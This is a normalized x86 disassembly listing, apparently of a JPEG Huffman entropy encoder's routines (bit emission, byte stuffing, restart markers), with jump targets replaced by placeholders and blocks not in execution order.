lea ecx [ eax + edx * 4 + 0x2c ]
push ecx
mov edx [ ebp - 0xc ]
push edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_42dc30
add esp 0x10
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
lea eax [ edx + ecx * 4 + 0x3c ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_42dc30
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x32
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp [ ebp - 0xc ] 0x4
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x32
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
cmp [ ebp - 0x10 ] 0x4
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
push 0x404
push 0x0
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x4c ]
push edx
call memset
add esp 0xc
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
cmp [ ecx + eax * 4 + 0x5c ] 0x0
jne r-xdata
push 0x404
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x4c ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ edx + ecx * 4 + 0x4c ] 0x0
jne r-xdata
push 0x404
push 0x0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x5c ]
push ecx
call memset
add esp 0xc
jmp r-xdata
push 0x404
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0x5c ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x14 ] 0x0
jmp r-xdata
sub_42e6a0
push ebp
mov ebp esp
sub esp 0x74
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
mov esi [ ebp - 0x4 ]
add esi 0xc
mov ecx 0x6
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xbc ] 0x0
je r-xdata
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x2c ]
cmp ecx [ eax + 0x100 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x28 ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
call sub_42ec80
add esp 0x8
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x28 ]
mov [ ecx ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x24 ]
mov [ ecx + 0x4 ] edx
mov edi [ ebp - 0x4 ]
add edi 0xc
mov ecx 0x6
lea esi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xbc ] 0x0
je r-xdata
mov edx [ ebp - 0x2c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x104 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xe8 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x34 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x3c ]
push edx
mov eax [ ebp - 0x34 ]
mov ecx [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx * 4 + 0x2c ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp + ecx * 4 - 0x18 ]
push edx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
push edx
lea eax [ ebp - 0x28 ]
push eax
call sub_42e850
add esp 0x14
and eax 0xff
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov al 0x1
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
movsx ecx [ eax ]
mov edx [ ebp - 0x30 ]
mov [ ebp + edx * 4 - 0x18 ] ecx
jmp r-xdata
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
sub eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x24 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov [ edx + 0x24 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x28 ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x28 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x28 ]
and eax 0x7
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x28 ] eax
mov edx [ ebp - 0x2c ]
add edx 0x1
mov [ ebp - 0x2c ] edx
sub_42e850
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
movsx ecx [ eax ]
sub ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
neg eax
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0xc ] 0xb
jle r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
sar eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
add eax [ ebp - 0xc ]
movsx ecx [ eax + 0x400 ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x14 ]
mov ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42eac0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x6
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42eac0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x40
jge r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx * 4 + r--data ]
mov eax [ ebp + 0xc ]
movsx ecx [ eax + edx * 2 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
mov edx [ ebp + 0x18 ]
movsx eax [ edx + 0x400 ]
push eax
mov ecx [ ebp + 0x18 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_42eac0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0xf
jle r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov eax [ ebp + 0x18 ]
movsx ecx [ eax + 0x4f0 ]
push ecx
mov edx [ ebp + 0x18 ]
mov eax [ edx + 0x3c0 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42eac0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0xc ] 0x1
mov ecx [ ebp - 0x4 ]
neg ecx
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx 0x1
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x14 ]
sub edx 0x10
mov [ ebp - 0x14 ] edx
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0xa
jle r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
shl ecx 0x4
add ecx [ ebp - 0xc ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x18 ]
add edx [ ebp - 0x18 ]
movsx eax [ edx + 0x400 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x18 ]
mov eax [ edx + ecx * 4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42eac0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x6
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp - 0x4 ]
sar eax 0x1
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42eac0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
xor al al
jmp r-xdata
sub_42eac0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0x8 ] edx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov ecx [ ebp + 0x10 ]
shl edx cl
sub edx 0x1
mov eax [ ebp - 0x4 ]
and eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx 0x18
sub ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
shl edx cl
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
or ecx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x28
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0xc ] edx
mov al 0x1
mov edx [ ebp - 0x4 ]
sar edx 0x10
and edx 0xff
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov dl [ ebp - 0xc ]
mov [ ecx ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0xff
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42ec20
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx 0x8
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x8 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_42ec20
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor al al
jmp r-xdata
sub_42ec20
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x18 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
push ecx
mov edx [ ebp - 0x4 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ec80
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
call sub_42ed80
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov edx [ ebp + 0xc ]
add edx 0xd0
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] dl
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42ec20
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_42ec20
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
xor al al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0xe4 ]
jge r-xdata
xor al al
jmp r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_42ed80
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
push 0x7
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_42eac0
add esp 0xc
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] 0x0
mov al 0x1
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42edd0
push ebp
mov ebp esp
sub esp 0x68
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
mov esi [ ebp - 0x4 ]
add esi 0xc
mov ecx 0x6
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
lea eax [ ebp - 0x28 ]
push eax
call sub_42ed80
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x28 ]
mov [ ecx ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x24 ]
mov [ ecx + 0x4 ] edx
mov edi [ ebp - 0x4 ]
add edi 0xc
mov ecx 0x6
lea esi [ ebp - 0x20 ]
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x18
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
sub_42ee70
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0xbc ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x100 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x104 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0xe8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx * 4 + 0x5c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x4c ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x14 ]
push ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42ef90
add esp 0x14
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + eax * 4 ]
movsx eax [ edx ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x14 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
cmp eax [ edx + 0xe4 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xbc ]
mov [ eax + 0x24 ] edx
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_42ef90
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
movsx ecx [ eax ]
sub ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
neg edx
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x8 ] 0xb
jle r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
sar ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
mov eax [ edx + ecx * 4 ]
add eax 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] eax
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x6
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x40
jge r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx * 4 + r--data ]
mov eax [ ebp + 0xc ]
movsx ecx [ eax + edx * 2 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x18 ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp [ ebp - 0x10 ] 0xf
jle r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ eax + 0x3c0 ]
add ecx 0x1
mov edx [ ebp + 0x18 ]
mov [ edx + 0x3c0 ] ecx
mov eax [ ebp - 0x10 ]
sub eax 0x10
mov [ ebp - 0x10 ] eax
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
mov ecx [ ebp - 0x4 ]
neg ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0xa
jle r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
shl eax 0x4
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ecx + eax * 4 ]
add edx 0x1
mov eax [ ebp - 0x10 ]
shl eax 0x4
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x18 ]
mov [ ecx + eax * 4 ] edx
mov [ ebp - 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x6
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov edx [ ebp - 0x4 ]
sar edx 0x1
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_42f110
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
push 0x4
push 0x0
lea edx [ ebp - 0x1c ]
push edx
call memset
add esp 0xc
push 0x4
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call memset
add esp 0xc
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0xe4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xe8 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
xor eax eax
mov al [ ebp + edx - 0x1c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ ebp + eax - 0x20 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx * 4 + 0x58 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
cmp [ ecx ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax + edx * 4 + 0x68 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
cmp [ edx ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x4c ]
push ecx
mov edx [ ebp - 0x18 ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42df10
add esp 0xc
mov edx [ ebp - 0xc ]
mov [ ebp + edx - 0x1c ] 0x1
mov edx [ ebp + 0x8 ]
push edx
call sub_420c30
add esp 0x4
mov ecx [ ebp - 0x18 ]
mov [ ecx ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x5c ]
push ecx
mov edx [ ebp - 0x18 ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42df10
add esp 0xc
mov edx [ ebp - 0x10 ]
mov [ ebp + edx - 0x20 ] 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_420c30
add esp 0x4
mov ecx [ ebp - 0x18 ]
mov [ ecx ] eax
sub_42f250
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x6c
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x15c ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_42f2d0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x4
jge r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] 0x0
pop edi
pop esi
